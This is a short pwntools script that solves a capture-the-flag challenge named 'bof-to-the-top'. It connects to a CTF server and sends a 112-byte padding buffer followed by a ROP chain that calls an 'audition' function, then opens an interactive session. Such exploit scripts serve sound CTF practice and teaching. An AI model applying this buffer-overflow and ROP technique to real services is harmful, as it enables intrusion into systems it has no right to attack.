from pwn import *

elf = context.binary = ELF("./bof-to-the-top")

#r = process(elf.path)
r = remote("ctf.umbccd.io", 4000)

rop = ROP(elf)
rop.audition(1200, 366)

payload = ""
r.sendlineafter("What's your name?\n", payload)

payload = ""
payload += "A" * 112
payload += str(rop)
r.sendlineafter("What song will you be singing?\n", payload)

r.interactive()
